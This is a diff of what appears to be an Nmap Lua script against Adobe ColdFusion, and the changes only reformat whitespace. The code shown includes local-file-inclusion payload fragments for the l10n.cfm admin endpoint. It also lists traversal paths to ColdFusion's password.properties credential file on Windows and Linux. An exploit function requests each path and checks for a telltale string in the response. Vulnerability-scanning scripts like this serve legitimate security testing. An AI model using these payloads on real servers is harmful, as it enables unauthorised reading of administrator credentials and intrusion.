@@ -43,16 +43,18 @@ local PATH_PAYLOAD = "CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attrib
 local IMG_PAYLOAD = "CFIDE/administrator/images/loginbackground.jpg"
 local LFI_PAYLOAD_FRAG_1 = "CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename="
 local LFI_PAYLOAD_FRAG_2 = "&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp"
-local CREDENTIALS_PAYLOADS = {"../../lib/password.properties",
-                             '..\\..\\lib\\password.properties', 
-                             '..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion10\\lib\\password.properties',
-                             "..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion10\\cfusion\\lib\\password.properties", 
-                             "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\JRun4\\servers\\cfusion\\cfusion-ear\\cfusion-war\\WEB-INF\\cfusion\\lib\\password.properties",
-                             "..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion9\\lib\\password.properties",
-                             "..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion9\\cfusion\\lib\\password.properties",
-                             "../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties",
-                             "../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties",
-                             "../../../../../../../../../opt/coldfusion9/cfusion/lib/password.properties"}
+local CREDENTIALS_PAYLOADS = {
+  "../../lib/password.properties",
+  "..\\..\\lib\\password.properties",
+  "..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion10\\lib\\password.properties",
+  "..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion10\\cfusion\\lib\\password.properties",
+  "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\JRun4\\servers\\cfusion\\cfusion-ear\\cfusion-war\\WEB-INF\\cfusion\\lib\\password.properties",
+  "..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion9\\lib\\password.properties",
+  "..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion9\\cfusion\\lib\\password.properties",
+  "../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties",
+  "../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties",
+  "../../../../../../../../../opt/coldfusion9/cfusion/lib/password.properties"
+}
 
 ---
 -- Extracts absolute path of installation by reading the ANALIZER_DIRECTORY value from the header 'set-cookie'
@@ -102,7 +104,7 @@ local function exploit(host, port, basepath)
     local req = http.get(host, port, basepath..LFI_PAYLOAD_FRAG_1..vector..LFI_PAYLOAD_FRAG_2)
       if req.body and string.find(req.body, "encrypted=true") then
         stdnse.print_debug(1, "%s: String pattern found. Exploitation worked with vector '%s'.", SCRIPT_NAME, vector)
-	return true, req.body
+        return true, req.body
       end
   end
 end
